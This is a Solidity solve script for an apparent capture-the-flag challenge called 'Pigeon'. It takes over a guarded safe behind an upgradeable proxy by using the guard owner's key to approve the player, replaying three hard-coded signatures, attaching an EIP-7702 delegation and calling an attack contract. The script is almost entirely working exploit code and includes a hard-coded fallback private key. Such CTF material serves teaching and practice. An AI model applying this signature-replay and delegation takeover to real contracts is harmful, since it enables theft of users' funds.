// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import "src/Pigeon.sol";
import "src/PigeonV2.sol";
import "src/SimpleSafe.sol";
import "src/SimpleGuard.sol";
import "src/Challenge.sol";
import {PlayerDelegate} from "../test/NewExploitTest.t.sol";

contract Solve is CTFSolver {
    function solve(address challenge, address player) internal override {
        uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xffd5b38489e6aa8d063bb017f3e0976f708c0d678bde9beeaee7166105dcb5a6));

        address pigeonProxy = address(Challenge(challenge).pigeonProxy());
        Pigeon pigeon = Pigeon(payable(pigeonProxy));
        SimpleSafe safe = pigeon.safe();
        SimpleGuard simpleGuard = SimpleGuard(safe.guard());
        PigeonV2 implV2 = PigeonV2(payable(0xd179E0Ee6C368788546eA5d5189E903FeC932257));
        {
            uint256 simpleGuardOwnerPK = vm.envUint("GUARD_PK");
            address guardOwner = vm.addr(simpleGuardOwnerPK);

            vm.stopBroadcast();
            vm.broadcast(simpleGuardOwnerPK);
            simpleGuard.approvePendingCaller(player);
        }

        vm.startBroadcast(playerPrivateKey);

        bytes memory _sig1 = hex'2f2779886c9e8de775fee7c494a1070badaf9fa9796a3fd1c57dd13e5267a5e0a917486e47c5fa81f4fb1b72b52d472c48ff03662a226c145a7a8fbea26291631c';
        bytes32 _msg1 = 0x41ab689e7f514f1771f1b3ec23a69496f1b125d90049028113dc0104fc2b7415;
        
        bytes memory _sig2 = hex'68bdeb41c7e84c39011eb7c4efe354bf6bd560f50b8dbe069b95d4e4e6f881857fe3dd22ebd8f104ed6bff9229d8e4fece40576edceb79ca36746779dd55ae5d1c';
        bytes32 _msg2 = 0x019a5590ea34b0cb112b8d7a5c8f7c377cb4e9e92b9c792c1f3a8b15a8b954f1;
        
        bytes memory _sig3 = hex'ed2a2d16080716c5e62638113957da6d65237433393d29bf3874d9747d0274896e5cda92f29e97c35656718c6d63560cdf1403dd3f39136c9442aee6a212a30e1c';
        bytes32 _msg3 = 0x88e3d1efaa1bef875e6ed1ab9982147005d2de2640687f4db8bcc2dc80e0c5fa;

        simpleGuard.confirmPendingCaller(player, _sig1, _msg1);
        simpleGuard.confirmPendingCaller(player, _sig2, _msg2);
        simpleGuard.confirmPendingCaller(player, _sig3, _msg3);

        PlayerDelegate playerImpl = new PlayerDelegate(pigeonProxy, address(safe), address(implV2));
        vm.signAndAttachDelegation(address(playerImpl), playerPrivateKey);

        PlayerDelegate(payable(player)).attack();

    }
}
